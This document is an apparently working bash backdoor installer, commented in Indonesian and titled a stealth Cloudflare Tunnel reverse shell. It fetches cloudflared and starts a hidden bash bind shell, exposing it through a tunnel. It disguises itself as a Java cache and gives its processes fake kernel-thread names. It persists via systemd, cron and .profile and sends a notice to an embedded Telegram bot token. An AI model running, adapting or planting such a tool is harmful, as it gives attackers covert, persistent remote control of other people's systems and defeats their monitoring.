#!/usr/bin/env bash
# Cloudflare Tunnel Reverse Shell (Stealth & Persistence)
# Usage: bash -c "$(curl -fsSL https://yourdomain.com/stealth.sh)"
# No uninstall token provided; manual cleanup required.

# ========== KONFIGURASI TERSEMBUNYI ==========
: "${HOME:=/tmp}"
: "${USER:=$(whoami 2>/dev/null || echo unknown)}"
: "${UID:=$(id -u 2>/dev/null || echo 0)}"

# Direktori instalasi: ~/.java (menyamar sebagai Java cache)
INSTALL_BASE="${HOME}/.java"
BIN_NAME="java"                     # nama binary disamarkan
CONFIG_DIR="${INSTALL_BASE}/.cache" # tempat konfigurasi tambahan
URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
TMPDIR="/tmp/.${UID}-cache"         # temporary, akan dihapus
PORT=$((RANDOM % 40000 + 10000))

# Daftar nama proses kernel (acak untuk menyembunyikan)
KERNEL_PROCS=(
    "[kworker/u:0]" "[kworker/0:0]" "[rcu_gp]" "[rcu_par_gp]"
    "[ksoftirqd/0]" "[kthreadd]" "[slub_flushwq]" "[kcompactd0]"
    "[kswapd0]" "[jbd2/sda1-8]" "[ext4-rsv-conver]"
)
PROC_HIDDEN_NAME="${KERNEL_PROCS[$((RANDOM % ${#KERNEL_PROCS[@]}))]}"

# Telegram notifikasi (opsional, bisa diisi atau dikosongkan)
TELEGRAM_BOT_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
TELEGRAM_CHAT_ID="6223261018"

# ========== FUNGSI ==========
print_step() { printf "%-50s" "$1"; }
finish_ok() { echo "[OK]"; }
finish_skip() { echo "[SKIPPING]"; }
finish_failed() { echo "[FAILED]"; exit 1; }
error() { echo -e "\033[1;31m$*\033[0m" >&2; }
info() { echo -e "\033[1;32m$*\033[0m" >&2; }
warn() { echo -e "\033[1;33m$*\033[0m" >&2; }

cleanup() {
    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true
}
trap cleanup EXIT

# Kirim notifikasi Telegram (jika token diisi)
send_telegram() {
    local message="$1"
    if [[ -n "$TELEGRAM_BOT_TOKEN" && "$TELEGRAM_BOT_TOKEN" != "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8" && -n "$TELEGRAM_CHAT_ID" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT_ID" -d text="$message" -d parse_mode="HTML" >/dev/null 2>&1 &
    fi
}

# Deteksi arsitektur
detect_arch() {
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    case "$os" in linux) os="linux" ;; darwin) os="darwin" ;; *) error "OS $os tidak didukung"; exit 1 ;; esac
    case "$arch" in
        x86_64|amd64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l) arch="arm" ;;
        i386|i686) arch="386" ;;
        *) error "Arsitektur $arch tidak didukung"; exit 1 ;;
    esac
    echo "${os}-${arch}"
}

# Download cloudflared
download_cloudflared() {
    local arch="$1"
    local url="${URL_BASE}/cloudflared-${arch}"
    local out="$TMPDIR/cloudflared"
    if command -v curl >/dev/null; then
        curl -fsSL -o "$out" "$url" 2>/dev/null || return 1
    elif command -v wget >/dev/null; then
        wget -q -O "$out" "$url" 2>/dev/null || return 1
    else
        return 1
    fi
    chmod 755 "$out"
    echo "$out"
}

# Bind shell di localhost
start_bindshell() {
    local port="$1"
    local bind_cmd
    if command -v socat >/dev/null; then
        bind_cmd="socat TCP-LISTEN:${port},bind=127.0.0.1,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    elif command -v ncat >/dev/null; then
        bind_cmd="ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
    elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
        bind_cmd="nc -l -p ${port} -s 127.0.0.1 -e /bin/bash"
    else
        bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
    fi
    ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
    echo $!
}

# Jalankan tunnel (langsung)
start_tunnel_direct() {
    local port="$1"
    local bin="$2"
    ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> /dev/null 2>&1 ) &
    echo $!
}

# Hapus instalasi lama (jika ada) – dengan penanganan error yang aman
remove_old_installation() {
    # Matikan semua proses yang terkait (berdasarkan nama binary atau direktori)
    pkill -f "$INSTALL_BASE/$BIN_NAME" 2>/dev/null || true
    pkill -f "cf_tunnel.sh" 2>/dev/null || true
    # Hapus file instalasi
    rm -rf "$INSTALL_BASE" 2>/dev/null || true
    rm -rf "$TMPDIR" 2>/dev/null || true
    # Hapus persistence
    if command -v crontab >/dev/null; then
        crontab -l 2>/dev/null | grep -v "$INSTALL_BASE" | crontab - 2>/dev/null || true
    fi
    if command -v systemctl >/dev/null; then
        systemctl --user stop cf-tunnel.service 2>/dev/null || true
        systemctl --user disable cf-tunnel.service 2>/dev/null || true
        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service" 2>/dev/null || true
        systemctl --user daemon-reload 2>/dev/null || true
    fi
    # Hapus dari .profile jika ada
    if [[ -f "${HOME}/.profile" ]]; then
        sed -i '/cf_tunnel/d' "${HOME}/.profile" 2>/dev/null || true
    fi
}

# Buat script persistence (tanpa log)
create_persistence_script() {
    local bin_path="$1"
    local port="$2"
    local script_path="${INSTALL_BASE}/.run.sh"
    mkdir -p "$INSTALL_BASE" 2>/dev/null || true
    cat > "$script_path" <<EOF
#!/bin/bash
# Persistence script - tidak menghasilkan log
BIN="$bin_path"
PORT=$port
PROC_NAME="$PROC_HIDDEN_NAME"
while true; do
    exec -a "\$PROC_NAME" "\$BIN" tunnel --url "tcp://127.0.0.1:\$PORT" 2>/dev/null
    sleep 10
done
EOF
    chmod 755 "$script_path"
    echo "$script_path"
}

# Pasang persistence
install_persistence() {
    local script_path="$1"
    # systemd user
    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null 2>&1; then
        mkdir -p "${HOME}/.config/systemd/user"
        cat > "${HOME}/.config/systemd/user/cf-tunnel.service" <<EOF
[Unit]
Description=Java Cache Cleaner
After=network.target

[Service]
ExecStart=$script_path
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null || true
        systemctl --user enable cf-tunnel.service 2>/dev/null || true
        systemctl --user start cf-tunnel.service 2>/dev/null || true
        return 0
    fi
    # cron fallback
    if command -v crontab >/dev/null; then
        (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
        return 0
    fi
    # .profile fallback (terakhir)
    if [[ -f "${HOME}/.profile" ]]; then
        if ! grep -q "$script_path" "${HOME}/.profile"; then
            echo "$script_path &" >> "${HOME}/.profile"
        fi
    fi
    return 0
}

# ========== MAIN ==========
# Bersihkan instalasi lama tanpa token
remove_old_installation

# Siapkan direktori
mkdir -p "$TMPDIR" 2>/dev/null || { error "Gagal membuat $TMPDIR"; exit 1; }
mkdir -p "$INSTALL_BASE" 2>/dev/null || { error "Gagal membuat $INSTALL_BASE"; exit 1; }

# Download binary
print_step "Mengunduh binary..."
arch=$(detect_arch)
cf_bin=$(download_cloudflared "$arch") || finish_failed
finish_ok

# Copy ke direktori instalasi
print_step "Menyiapkan binary..."
cp "$cf_bin" "$INSTALL_BASE/$BIN_NAME" 2>/dev/null || { error "Gagal menyalin binary"; finish_failed; }
chmod 755 "$INSTALL_BASE/$BIN_NAME"
finish_ok

# Tes binary
print_step "Menguji binary..."
if ! "$INSTALL_BASE/$BIN_NAME" --version &>/dev/null; then
    finish_failed
fi
finish_ok

# Jalankan bindshell dan tunnel
print_step "Menjalankan tunnel..."
bind_pid=$(start_bindshell "$PORT")
tunnel_pid=$(start_tunnel_direct "$PORT" "$INSTALL_BASE/$BIN_NAME")
finish_ok

# Simpan PID untuk referensi (opsional)
echo "$bind_pid" > "$INSTALL_BASE/.bind.pid"
echo "$tunnel_pid" > "$INSTALL_BASE/.tunnel.pid"

# Coba dapatkan URL tunnel (opsional, tidak wajib)
sleep 3
send_telegram "✅ Tunnel berhasil dijalankan dengan port $PORT. Proses tersembunyi."

# Pasang persistence
print_step "Memasang persistence..."
persistence_script=$(create_persistence_script "$INSTALL_BASE/$BIN_NAME" "$PORT")
install_persistence "$persistence_script"
finish_ok

info "Instalasi selesai. Tunnel berjalan di background dengan nama proses '$PROC_HIDDEN_NAME'."
info "Untuk menghubungi: gunakan cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"
info "Tidak ada uninstaller. Hapus manual dengan: rm -rf $INSTALL_BASE; pkill -f '$PROC_HIDDEN_NAME'"

# Selesai
